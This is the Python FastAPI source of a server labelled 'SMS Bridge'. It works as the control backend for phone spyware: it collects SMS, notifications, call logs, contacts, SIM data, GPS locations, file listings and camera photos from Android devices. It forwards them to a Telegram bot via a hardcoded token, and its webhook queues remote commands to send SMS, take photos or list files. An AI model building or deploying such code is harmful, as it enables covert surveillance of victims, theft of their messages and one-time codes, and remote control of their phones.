from fastapi import FastAPI, HTTPException, Header, Depends, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, Response
from pydantic import BaseModel
from typing import Optional, List
import httpx, os, sqlite3, uuid, json, base64
from contextlib import contextmanager
from datetime import datetime

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

BOT_TOKEN = "8316470557:AAHtVja8KtF3QFQ_nudfgA0ybFLrhycl8KQ"
CHAT_ID   = "6764413681"
SECRET    = "bridge_x9k2m7p4q1"
DB_PATH   = os.getenv("DB_PATH", "/data/sms.db")
PHOTO_DIR = "/data/photos"

# ── DB init + migration ───────────────────────────────────────────────────────

def init_db():
    db_dir = os.path.dirname(DB_PATH) or "."
    os.makedirs(db_dir, exist_ok=True)
    os.makedirs(PHOTO_DIR, exist_ok=True)
    with sqlite3.connect(DB_PATH) as c:
        c.executescript("""
            CREATE TABLE IF NOT EXISTS messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT, device TEXT, sender TEXT,
                body TEXT, received_at TEXT, forwarded INTEGER DEFAULT 0,
                created_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS notifications (
                id INTEGER PRIMARY KEY AUTOINCREMENT, device TEXT, app_name TEXT,
                app_package TEXT, title TEXT, text TEXT,
                created_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS calls (
                id INTEGER PRIMARY KEY AUTOINCREMENT, device TEXT, number TEXT,
                type TEXT, duration INTEGER DEFAULT 0,
                created_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS call_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT, device TEXT, number TEXT,
                name TEXT, type TEXT, duration INTEGER, call_date INTEGER,
                synced_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS contacts (
                device TEXT, name TEXT, number TEXT,
                synced_at TEXT DEFAULT (datetime('now')),
                PRIMARY KEY (device, number)
            );
            CREATE TABLE IF NOT EXISTS installed_apps (
                device TEXT, app_name TEXT, PRIMARY KEY (device, app_name)
            );
            CREATE TABLE IF NOT EXISTS sim_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT, device TEXT, slot INTEGER,
                carrier TEXT, display_name TEXT, number TEXT, country TEXT,
                mcc TEXT, mnc TEXT, icc_id TEXT, roaming INTEGER, network_type TEXT,
                synced_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS file_listings (
                id INTEGER PRIMARY KEY AUTOINCREMENT, device TEXT, path TEXT,
                entries TEXT, updated_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS photos (
                id INTEGER PRIMARY KEY AUTOINCREMENT, device TEXT, camera TEXT,
                filename TEXT, created_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS commands (
                id TEXT PRIMARY KEY, device TEXT, type TEXT, payload TEXT,
                status TEXT DEFAULT 'pending',
                created_at TEXT DEFAULT (datetime('now')), acked_at TEXT
            );
            CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
            CREATE TABLE IF NOT EXISTS heartbeats (
                device TEXT PRIMARY KEY, last_seen TEXT,
                last_error INTEGER, battery INTEGER, charging INTEGER,
                wifi INTEGER, signal INTEGER, network_type TEXT
            );
            CREATE TABLE IF NOT EXISTS locations (
                id INTEGER PRIMARY KEY AUTOINCREMENT, device TEXT,
                lat REAL, lng REAL, accuracy REAL,
                recorded_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS events (
                id INTEGER PRIMARY KEY AUTOINCREMENT, device TEXT,
                event TEXT, detail TEXT DEFAULT '',
                created_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS devices (
                id TEXT PRIMARY KEY, display_name TEXT,
                first_seen TEXT DEFAULT (datetime('now')), phone_number TEXT DEFAULT ''
            );
            CREATE TABLE IF NOT EXISTS retry_queue (
                id INTEGER PRIMARY KEY AUTOINCREMENT, device TEXT, sender TEXT,
                body TEXT, received_at TEXT, attempts INTEGER DEFAULT 0,
                created_at TEXT DEFAULT (datetime('now'))
            );
            INSERT OR IGNORE INTO settings VALUES ('enabled','1');
        """)
        c.commit()

def migrate_db():
    """Add new columns to existing tables. Silently skips if already exists."""
    cols = [
        ("heartbeats", "last_error",    "INTEGER"),
        ("heartbeats", "battery",       "INTEGER"),
        ("heartbeats", "charging",      "INTEGER"),
        ("heartbeats", "wifi",          "INTEGER"),
        ("heartbeats", "signal",        "INTEGER"),
        ("heartbeats", "network_type",  "TEXT"),
    ]
    with sqlite3.connect(DB_PATH) as c:
        for table, col, typ in cols:
            try:
                c.execute(f"ALTER TABLE {table} ADD COLUMN {col} {typ}")
            except sqlite3.OperationalError:
                pass  # Already exists
        c.commit()

init_db()
migrate_db()

@contextmanager
def db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    try:
        yield conn
    finally:
        conn.close()

def auth(x_secret: str = Header(...)):
    if x_secret != SECRET:
        raise HTTPException(401)

def ensure_device(c, device: str):
    if not c.execute("SELECT id FROM devices WHERE id=?", (device,)).fetchone():
        c.execute("INSERT OR IGNORE INTO devices (id,display_name) VALUES (?,?)", (device, device))
        c.execute("INSERT INTO events (device,event,detail) VALUES (?,?,?)",
                  (device, "new_device", f"New device registered: {device}"))
        c.commit()

async def send_tg(text: str, chat_id: str = None) -> bool:
    cid = chat_id or CHAT_ID
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    async with httpx.AsyncClient(timeout=10) as c:
        try:
            r = await c.post(url, json={"chat_id": cid, "text": text, "parse_mode": "HTML"})
            return r.status_code == 200
        except:
            return False

async def send_tg_photo(photo_path: str, caption: str) -> bool:
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    async with httpx.AsyncClient(timeout=30) as c:
        try:
            with open(photo_path, "rb") as f:
                r = await c.post(url, data={"chat_id": CHAT_ID, "caption": caption},
                                 files={"photo": f})
            return r.status_code == 200
        except:
            return False

# ── Models ────────────────────────────────────────────────────────────────────

class SMS(BaseModel):
    device: str; sender: str; body: str; received_at: Optional[str] = None

class Heartbeat(BaseModel):
    device: str; last_error: Optional[int] = None
    battery: Optional[int] = None; charging: Optional[bool] = None
    wifi: Optional[bool] = None; signal: Optional[int] = None
    network_type: Optional[str] = None

class LocationUpdate(BaseModel):
    device: str; lat: float; lng: float; accuracy: float

class NotificationPayload(BaseModel):
    device: str; app_name: str; app_package: str; title: str; text: str

class CallPayload(BaseModel):
    device: str; number: str; type: str; duration: int = 0

class CallLogPayload(BaseModel):
    device: str; entries: list

class ContactsPayload(BaseModel):
    device: str; contacts: list

class AppsPayload(BaseModel):
    device: str; apps: List[str]

class SimInfoPayload(BaseModel):
    device: str; sims: list

class FilesPayload(BaseModel):
    device: str; path: str; entries: list

class PhotoPayload(BaseModel):
    device: str; camera: str; data: str

class EventPayload(BaseModel):
    device: str; event: str; detail: str = ""

class CommandAck(BaseModel):
    command_id: str; status: str

class CommandCreate(BaseModel):
    device: str; type: str; payload: dict = {}

class DeviceRename(BaseModel):
    device_id: str; new_name: str

class PhoneUpdate(BaseModel):
    device_id: str; phone_number: str

# ── Dashboard ─────────────────────────────────────────────────────────────────

@app.get("/")
def root():
    return FileResponse("static/index.html")

# ── SMS ───────────────────────────────────────────────────────────────────────

@app.post("/sms")
async def recv_sms(sms: SMS, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    ts = sms.received_at or datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    with db() as c:
        ensure_device(c, sms.device)
        enabled = (c.execute("SELECT value FROM settings WHERE key='enabled'").fetchone() or {"value":"1"})["value"] == "1"
        dev_on  = (c.execute("SELECT value FROM settings WHERE key=?", (f"enabled_{sms.device.replace(' ','_')}",)).fetchone() or {"value":"1"})["value"] == "1"
        active  = enabled and dev_on
        c.execute("INSERT INTO messages (device,sender,body,received_at,forwarded) VALUES (?,?,?,?,?)",
                  (sms.device, sms.sender, sms.body, ts, int(active)))
        c.commit()
    fwd = False
    if active:
        with db() as c:
            d = c.execute("SELECT display_name,phone_number FROM devices WHERE id=?", (sms.device,)).fetchone()
            label = (d["display_name"] if d else sms.device) + (f" ({d['phone_number']})" if d and d["phone_number"] else "")
        fwd = await send_tg(f"📱 <b>{label}</b>\n👤 <code>{sms.sender}</code>\n🕐 {ts}\n──────────────\n{sms.body}")
        if not fwd:
            with db() as c:
                c.execute("INSERT INTO retry_queue (device,sender,body,received_at) VALUES (?,?,?,?)",
                          (sms.device, sms.sender, sms.body, ts))
                c.commit()
    return {"ok": True, "forwarded": fwd}

# ── Heartbeat ─────────────────────────────────────────────────────────────────

@app.post("/heartbeat")
def heartbeat(hb: Heartbeat, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    with db() as c:
        ensure_device(c, hb.device)
        c.execute("""INSERT OR REPLACE INTO heartbeats
            (device,last_seen,last_error,battery,charging,wifi,signal,network_type)
            VALUES (?,?,?,?,?,?,?,?)""",
            (hb.device, now, hb.last_error,
             hb.battery,
             int(hb.charging) if hb.charging is not None else None,
             int(hb.wifi)     if hb.wifi    is not None else None,
             hb.signal, hb.network_type))
        c.commit()
    return {"ok": True}

# ── Location ──────────────────────────────────────────────────────────────────

@app.post("/location")
def location(loc: LocationUpdate, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    with db() as c:
        ensure_device(c, loc.device)
        c.execute("INSERT INTO locations (device,lat,lng,accuracy) VALUES (?,?,?,?)",
                  (loc.device, loc.lat, loc.lng, loc.accuracy))
        c.commit()
    return {"ok": True}

# ── Notifications ─────────────────────────────────────────────────────────────

@app.post("/notification")
async def notification(n: NotificationPayload, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    with db() as c:
        ensure_device(c, n.device)
        c.execute("INSERT INTO notifications (device,app_name,app_package,title,text) VALUES (?,?,?,?,?)",
                  (n.device, n.app_name, n.app_package, n.title, n.text))
        c.commit()
        d = c.execute("SELECT display_name FROM devices WHERE id=?", (n.device,)).fetchone()
    await send_tg(f"🔔 <b>{n.app_name}</b> — {d['display_name'] if d else n.device}\n<b>{n.title}</b>\n{n.text}")
    return {"ok": True}

# ── Calls ─────────────────────────────────────────────────────────────────────

@app.post("/call")
async def call(c_: CallPayload, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    with db() as c:
        ensure_device(c, c_.device)
        c.execute("INSERT INTO calls (device,number,type,duration) VALUES (?,?,?,?)",
                  (c_.device, c_.number, c_.type, c_.duration))
        c.commit()
        d = c.execute("SELECT display_name FROM devices WHERE id=?", (c_.device,)).fetchone()
    icon = {"missed":"📵","incoming_ringing":"📲","ended":"📞"}.get(c_.type,"📞")
    dur  = f" ({c_.duration}s)" if c_.type == "ended" and c_.duration else ""
    await send_tg(f"{icon} <b>{c_.type.replace('_',' ').title()}</b>{dur}\n📱 {d['display_name'] if d else c_.device}\n👤 <code>{c_.number}</code>")
    return {"ok": True}

@app.post("/calllog")
def calllog(payload: CallLogPayload, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    with db() as c:
        ensure_device(c, payload.device)
        c.execute("DELETE FROM call_log WHERE device=?", (payload.device,))
        for e in payload.entries:
            c.execute("INSERT INTO call_log (device,number,name,type,duration,call_date) VALUES (?,?,?,?,?,?)",
                      (payload.device, e.get("number",""), e.get("name",""),
                       e.get("type",""), e.get("duration",0), e.get("date",0)))
        c.commit()
    return {"ok": True}

@app.get("/calllog/{device}")
def get_calllog(device: str, _=Depends(auth)):
    with db() as c:
        rows = c.execute("SELECT * FROM call_log WHERE device=? ORDER BY call_date DESC LIMIT 200", (device,)).fetchall()
        return [dict(r) for r in rows]

# ── Contacts ──────────────────────────────────────────────────────────────────

@app.post("/contacts")
def contacts(payload: ContactsPayload, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    with db() as c:
        ensure_device(c, payload.device)
        c.execute("DELETE FROM contacts WHERE device=?", (payload.device,))
        for ct in payload.contacts:
            c.execute("INSERT OR IGNORE INTO contacts (device,name,number) VALUES (?,?,?)",
                      (payload.device, ct.get("name",""), ct.get("number","")))
        c.commit()
    return {"ok": True}

@app.get("/contacts/{device}")
def get_contacts(device: str, _=Depends(auth)):
    with db() as c:
        rows = c.execute("SELECT name,number FROM contacts WHERE device=? ORDER BY name", (device,)).fetchall()
        return [dict(r) for r in rows]

# ── Contacts download — x_secret as QUERY param (browser link) ───────────────

@app.get("/contacts/{device}/download")
def download_contacts(device: str, fmt: str = "csv", secret: str = ""):
    if secret != SECRET:
        raise HTTPException(401, "Invalid secret")
    with db() as c:
        rows = c.execute("SELECT name,number FROM contacts WHERE device=? ORDER BY name", (device,)).fetchall()
    if fmt == "vcf":
        lines = []
        for r in rows:
            lines += ["BEGIN:VCARD","VERSION:3.0",f"FN:{r['name']}",f"TEL:{r['number']}","END:VCARD"]
        body = "\n".join(lines)
        return Response(content=body, media_type="text/vcard",
                        headers={"Content-Disposition": f'attachment; filename="{device}_contacts.vcf"'})
    lines = ["Name,Number"]
    for r in rows:
        nm = str(r["name"]).replace('"', '""')
        nu = str(r["number"]).replace('"', '""')
        lines.append(f'"{nm}","{nu}"')
    body = "\n".join(lines)
    return Response(content=body, media_type="text/csv",
                    headers={"Content-Disposition": f'attachment; filename="{device}_contacts.csv"'})

# ── Apps ──────────────────────────────────────────────────────────────────────

@app.post("/apps")
def apps(payload: AppsPayload, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    with db() as c:
        ensure_device(c, payload.device)
        c.execute("DELETE FROM installed_apps WHERE device=?", (payload.device,))
        for a in payload.apps:
            c.execute("INSERT OR IGNORE INTO installed_apps (device,app_name) VALUES (?,?)", (payload.device, a))
        c.commit()
    return {"ok": True}

@app.get("/apps/{device}")
def get_apps(device: str, _=Depends(auth)):
    with db() as c:
        rows = c.execute("SELECT app_name FROM installed_apps WHERE device=? ORDER BY app_name", (device,)).fetchall()
        return [r["app_name"] for r in rows]

# ── SIM Info ──────────────────────────────────────────────────────────────────

@app.post("/siminfo")
def siminfo(payload: SimInfoPayload, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    with db() as c:
        ensure_device(c, payload.device)
        c.execute("DELETE FROM sim_info WHERE device=?", (payload.device,))
        for s in payload.sims:
            c.execute(
                "INSERT INTO sim_info (device,slot,carrier,display_name,number,country,mcc,mnc,icc_id,roaming,network_type) VALUES (?,?,?,?,?,?,?,?,?,?,?)",
                (payload.device, s.get("slot",1), s.get("carrier",""), s.get("display_name",""),
                 s.get("number",""), s.get("country",""), s.get("mcc",""), s.get("mnc",""),
                 s.get("icc_id",""), int(s.get("roaming",False)), s.get("network_type",""))
            )
        c.commit()
    return {"ok": True}

@app.get("/siminfo/{device}")
def get_siminfo(device: str, _=Depends(auth)):
    with db() as c:
        rows = c.execute("SELECT * FROM sim_info WHERE device=? ORDER BY slot", (device,)).fetchall()
        return [dict(r) for r in rows]

# ── File Browser ──────────────────────────────────────────────────────────────

@app.post("/files")
def files(payload: FilesPayload, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    with db() as c:
        ensure_device(c, payload.device)
        c.execute("DELETE FROM file_listings WHERE device=? AND path=?", (payload.device, payload.path))
        c.execute("INSERT INTO file_listings (device,path,entries) VALUES (?,?,?)",
                  (payload.device, payload.path, json.dumps(payload.entries)))
        c.commit()
    return {"ok": True}

@app.get("/files/{device}")
def get_files(device: str, path: str = "/", _=Depends(auth)):
    with db() as c:
        row = c.execute(
            "SELECT * FROM file_listings WHERE device=? AND path=? ORDER BY id DESC LIMIT 1",
            (device, path)).fetchone()
        if not row:
            return {"device": device, "path": path, "entries": [], "cached": False}
        return {"device": device, "path": path,
                "entries": json.loads(row["entries"]),
                "updated": row["updated_at"], "cached": True}

# ── Photos ────────────────────────────────────────────────────────────────────

@app.post("/photo")
async def upload_photo(payload: PhotoPayload, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    ts       = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    filename = f"{payload.device.replace(' ','_')}_{payload.camera}_{ts}.jpg"
    filepath = os.path.join(PHOTO_DIR, filename)
    try:
        with open(filepath, "wb") as f:
            f.write(base64.b64decode(payload.data))
        with db() as c:
            ensure_device(c, payload.device)
            c.execute("INSERT INTO photos (device,camera,filename) VALUES (?,?,?)",
                      (payload.device, payload.camera, filename))
            c.commit()
        await send_tg_photo(filepath, f"📸 {payload.device} ({payload.camera}) — {ts}")
    except Exception as e:
        return {"ok": False, "error": str(e)}
    return {"ok": True, "filename": filename}

@app.get("/photo/{filename}")
def get_photo(filename: str, secret: str = ""):
    if secret != SECRET: raise HTTPException(401)
    filepath = os.path.join(PHOTO_DIR, filename)
    if not os.path.exists(filepath): raise HTTPException(404)
    with open(filepath, "rb") as f: data = f.read()
    return Response(content=data, media_type="image/jpeg")

@app.get("/photos/{device}")
def get_photos(device: str, _=Depends(auth)):
    with db() as c:
        rows = c.execute("SELECT * FROM photos WHERE device=? ORDER BY id DESC LIMIT 20", (device,)).fetchall()
        return [dict(r) for r in rows]

# ── Commands ──────────────────────────────────────────────────────────────────

@app.get("/commands/pending")
def pending_commands(device: str, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    with db() as c:
        rows = c.execute(
            "SELECT * FROM commands WHERE device=? AND status='pending' ORDER BY created_at LIMIT 10",
            (device,)).fetchall()
        return [dict(r) for r in rows]

@app.post("/commands/ack")
def ack_command(ack: CommandAck, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    with db() as c:
        c.execute("UPDATE commands SET status=?, acked_at=? WHERE id=?",
                  (ack.status, now, ack.command_id))
        c.commit()
    return {"ok": True}

@app.post("/commands")
def create_command(cmd: CommandCreate, _=Depends(auth)):
    cmd_id = str(uuid.uuid4())[:8]
    with db() as c:
        c.execute("INSERT INTO commands (id,device,type,payload) VALUES (?,?,?,?)",
                  (cmd_id, cmd.device, cmd.type, json.dumps(cmd.payload)))
        c.commit()
    return {"ok": True, "id": cmd_id}

# ── Event ─────────────────────────────────────────────────────────────────────

@app.post("/event")
def event(ev: EventPayload, x_secret: str = Header(...)):
    if x_secret != SECRET: raise HTTPException(401)
    with db() as c:
        ensure_device(c, ev.device)
        c.execute("INSERT INTO events (device,event,detail) VALUES (?,?,?)",
                  (ev.device, ev.event, ev.detail))
        c.commit()
    return {"ok": True}

# ── Dashboard data ────────────────────────────────────────────────────────────

@app.get("/dashboard")
def dashboard(_=Depends(auth)):
    with db() as c:
        total    = c.execute("SELECT COUNT(*) as n FROM messages").fetchone()["n"]
        fwd      = c.execute("SELECT COUNT(*) as n FROM messages WHERE forwarded=1").fetchone()["n"]
        retry_n  = c.execute("SELECT COUNT(*) as n FROM retry_queue").fetchone()["n"]
        notif_n  = c.execute("SELECT COUNT(*) as n FROM notifications").fetchone()["n"]
        hb_map   = {r["device"]: dict(r) for r in c.execute("SELECT * FROM heartbeats").fetchall()}
        settings = {r["key"]: r["value"] for r in c.execute("SELECT * FROM settings").fetchall()}
        devs_db  = {r["id"]: dict(r) for r in c.execute("SELECT * FROM devices").fetchall()}
        msg_stat = {r["device"]: dict(r) for r in c.execute(
            "SELECT device,COUNT(*) as total,SUM(forwarded) as forwarded,MAX(received_at) as last_msg FROM messages GROUP BY device"
        ).fetchall()}
        messages = c.execute("SELECT * FROM messages ORDER BY id DESC LIMIT 50").fetchall()
        notifs   = c.execute("SELECT * FROM notifications ORDER BY id DESC LIMIT 50").fetchall()
        calls    = c.execute("SELECT * FROM calls ORDER BY id DESC LIMIT 30").fetchall()
        events   = c.execute("SELECT * FROM events ORDER BY id DESC LIMIT 100").fetchall()
        locs     = {}
        for r in c.execute("SELECT DISTINCT device FROM locations").fetchall():
            loc = c.execute("SELECT * FROM locations WHERE device=? ORDER BY id DESC LIMIT 1", (r["device"],)).fetchone()
            if loc: locs[r["device"]] = dict(loc)

        now = datetime.utcnow()
        ERR = {101:"SMS denied",102:"Location denied",103:"Not default SMS",
               201:"No internet",202:"Timeout",301:"Bad secret",401:"GPS off"}
        all_ids = set(list(devs_db) + list(hb_map) + list(msg_stat))
        devices = []
        for dev_id in all_ids:
            hb   = hb_map.get(dev_id, {})
            info = devs_db.get(dev_id, {})
            stat = msg_stat.get(dev_id, {"total":0,"forwarded":0,"last_msg":None})
            ls   = hb.get("last_seen")
            if ls:
                diff   = (now - datetime.strptime(ls, "%Y-%m-%d %H:%M:%S")).total_seconds()
                status = "active" if diff < 600 else "idle"
            else: status = "unknown"
            err = hb.get("last_error")
            n_cnt  = c.execute("SELECT COUNT(*) as n FROM notifications WHERE device=?", (dev_id,)).fetchone()["n"]
            c_cnt  = c.execute("SELECT COUNT(*) as n FROM calls WHERE device=?", (dev_id,)).fetchone()["n"]
            a_cnt  = c.execute("SELECT COUNT(*) as n FROM installed_apps WHERE device=?", (dev_id,)).fetchone()["n"]
            ct_cnt = c.execute("SELECT COUNT(*) as n FROM contacts WHERE device=?", (dev_id,)).fetchone()["n"]
            cl_cnt = c.execute("SELECT COUNT(*) as n FROM call_log WHERE device=?", (dev_id,)).fetchone()["n"]
            ph_cnt = c.execute("SELECT COUNT(*) as n FROM photos WHERE device=?", (dev_id,)).fetchone()["n"]
            sims   = [dict(r) for r in c.execute("SELECT * FROM sim_info WHERE device=? ORDER BY slot", (dev_id,)).fetchall()]
            latest_photo = c.execute("SELECT filename FROM photos WHERE device=? ORDER BY id DESC LIMIT 1", (dev_id,)).fetchone()
            devices.append({
                "device_id":     dev_id,
                "display_name":  info.get("display_name", dev_id),
                "phone_number":  info.get("phone_number", ""),
                "first_seen":    info.get("first_seen"),
                "total":         stat["total"],
                "forwarded":     stat["forwarded"] or 0,
                "last_msg":      stat["last_msg"],
                "last_seen":     ls,
                "status":        status,
                "last_error":    err,
                "error_desc":    ERR.get(err,"") if err else "",
                "enabled":       settings.get(f"enabled_{dev_id.replace(' ','_')}","1") == "1",
                "location":      locs.get(dev_id),
                "battery":       hb.get("battery"),
                "charging":      bool(hb.get("charging")) if hb.get("charging") is not None else None,
                "wifi":          bool(hb.get("wifi")) if hb.get("wifi") is not None else None,
                "signal":        hb.get("signal"),
                "network_type":  hb.get("network_type"),
                "notif_count":   n_cnt, "call_count": c_cnt, "app_count": a_cnt,
                "contact_count": ct_cnt, "calllog_count": cl_cnt, "photo_count": ph_cnt,
                "latest_photo":  latest_photo["filename"] if latest_photo else None,
                "sims":          sims,
            })
        return {
            "total": total, "forwarded": fwd, "retry_pending": retry_n,
            "notif_total": notif_n,
            "global_enabled": settings.get("enabled","1") == "1",
            "devices":       devices,
            "messages":      [dict(m) for m in messages],
            "notifications": [dict(n) for n in notifs],
            "calls":         [dict(c) for c in calls],
            "events":        [dict(e) for e in events],
        }

@app.get("/messages")
def messages(_=Depends(auth)):
    with db() as c:
        return [dict(r) for r in c.execute("SELECT * FROM messages ORDER BY id DESC LIMIT 100").fetchall()]

@app.post("/toggle/global")
def toggle_global(enabled: bool, _=Depends(auth)):
    with db() as c:
        c.execute("INSERT OR REPLACE INTO settings VALUES ('enabled',?)", ("1" if enabled else "0",))
        c.commit()
    return {"enabled": enabled}

@app.post("/toggle/device")
def toggle_device(device: str, enabled: bool, _=Depends(auth)):
    with db() as c:
        c.execute("INSERT OR REPLACE INTO settings VALUES (?,?)",
                  (f"enabled_{device.replace(' ','_')}", "1" if enabled else "0"))
        c.commit()
    return {"device": device, "enabled": enabled}

@app.post("/device/rename")
def rename(body: DeviceRename, _=Depends(auth)):
    with db() as c:
        c.execute("UPDATE devices SET display_name=? WHERE id=?", (body.new_name, body.device_id))
        c.execute("INSERT INTO events (device,event,detail) VALUES (?,?,?)",
                  (body.device_id, "renamed", f"Renamed to: {body.new_name}"))
        c.commit()
    return {"ok": True}

@app.post("/device/phone")
def set_phone(body: PhoneUpdate, _=Depends(auth)):
    with db() as c:
        c.execute("UPDATE devices SET phone_number=? WHERE id=?", (body.phone_number, body.device_id))
        c.commit()
    return {"ok": True}

@app.delete("/messages")
def clear(_=Depends(auth)):
    with db() as c:
        c.execute("DELETE FROM messages")
        c.commit()
    return {"ok": True}

@app.post("/telegram-webhook")
async def tg_webhook(req: Request):
    try:
        data = await req.json()
        msg  = data.get("message", {})
        text = (msg.get("text") or "").strip()
        cid  = str(msg.get("chat", {}).get("id",""))
        if not text: return {"ok": True}
        if text == "/start":
            await send_tg("👋 <b>SMS Bridge active</b>\n\n"
                "/list — show devices\n"
                "/sms Name +91XXX message\n"
                "/photo Name back|front\n"
                "/dnd on|off Name\n"
                "/files Name /path", cid)
        elif text.startswith("/list"):
            with db() as c:
                devs = c.execute("SELECT id,display_name FROM devices").fetchall()
            await send_tg("\n".join([f"• {d['display_name']}" for d in devs]) or "No devices", cid)
        elif text.startswith("/sms "):
            parts = text[5:].split(" ", 2)
            if len(parts) < 3:
                await send_tg("Usage: /sms DeviceName +91XXX message", cid)
            else:
                dname, number, message = parts
                with db() as c:
                    rows = c.execute("SELECT id FROM devices WHERE display_name LIKE ?", (f"%{dname}%",)).fetchall()
                if not rows: await send_tg(f"Device '{dname}' not found", cid)
                else:
                    cid2 = str(uuid.uuid4())[:8]
                    with db() as c:
                        c.execute("INSERT INTO commands (id,device,type,payload) VALUES (?,?,?,?)",
                                  (cid2, rows[0]["id"], "send_sms", json.dumps({"to":number,"text":message})))
                        c.commit()
                    await send_tg(f"✓ SMS queued to {number}", cid)
        elif text.startswith("/photo "):
            parts = text[7:].split(" ", 1)
            dname = parts[0]; cam = parts[1] if len(parts) > 1 else "back"
            with db() as c:
                rows = c.execute("SELECT id FROM devices WHERE display_name LIKE ?", (f"%{dname}%",)).fetchall()
            if not rows: await send_tg(f"Device '{dname}' not found", cid)
            else:
                cid2 = str(uuid.uuid4())[:8]
                with db() as c:
                    c.execute("INSERT INTO commands (id,device,type,payload) VALUES (?,?,?,?)",
                              (cid2, rows[0]["id"], "take_photo", json.dumps({"camera":cam})))
                    c.commit()
                await send_tg("📸 Camera command queued, photo arriving in ~30s", cid)
        elif text.startswith("/dnd "):
            parts = text[5:].split(" ", 1)
            state = parts[0]; dname = parts[1] if len(parts) > 1 else ""
            with db() as c:
                rows = c.execute("SELECT id FROM devices WHERE display_name LIKE ?", (f"%{dname}%",)).fetchall()
            if not rows: await send_tg(f"Device '{dname}' not found", cid)
            else:
                cid2 = str(uuid.uuid4())[:8]
                with db() as c:
                    c.execute("INSERT INTO commands (id,device,type,payload) VALUES (?,?,?,?)",
                              (cid2, rows[0]["id"], f"dnd_{state}", "{}"))
                    c.commit()
                await send_tg(f"🔕 DND {state} queued", cid)
        elif text.startswith("/files "):
            parts = text[7:].split(" ", 1)
            dname = parts[0]; path = parts[1] if len(parts) > 1 else "/"
            with db() as c:
                rows = c.execute("SELECT id FROM devices WHERE display_name LIKE ?", (f"%{dname}%",)).fetchall()
            if not rows: await send_tg(f"Device '{dname}' not found", cid)
            else:
                cid2 = str(uuid.uuid4())[:8]
                with db() as c:
                    c.execute("INSERT INTO commands (id,device,type,payload) VALUES (?,?,?,?)",
                              (cid2, rows[0]["id"], "list_files", json.dumps({"path":path})))
                    c.commit()
                await send_tg(f"📁 File listing requested for {path}", cid)
    except Exception:
        pass
    return {"ok": True}

app.mount("/static", StaticFiles(directory="static"), name="static")
